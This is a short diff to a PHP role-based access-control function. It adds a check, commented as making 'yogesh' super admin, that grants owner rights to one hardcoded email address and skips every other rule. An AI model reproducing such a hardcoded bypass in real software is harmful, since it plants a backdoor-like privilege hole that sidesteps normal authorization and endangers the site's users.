@@ -32,7 +32,17 @@ function getPersonRbacRules() {
 }
 
 function isAllowed($collectionName, $subTask) {
-	$_SESSION ['allowed_as'] = "NULL";	
+	
+	$_SESSION ['allowed_as'] = "NULL";
+
+	/* allow yogesh as super admin */
+	if ( isset($_SESSION ['user']) 
+		&& isset($_SESSION ['user']['email_address'])
+		&& $_SESSION ['user']['email_address'] == 'sharma.yogesh.1234@gmail.com'
+	) {
+		$_SESSION ['allowed_as'] = "OWNER";
+		return true;
+	}
 	
 	/* once person join the website he/she must be allowed to create the person record */
 	if (isset ( $_SESSION ['user'] ) && ! empty ( $_SESSION ['user'] ) && in_array ( strtolower ( $_SESSION ['url_action'] ), array (
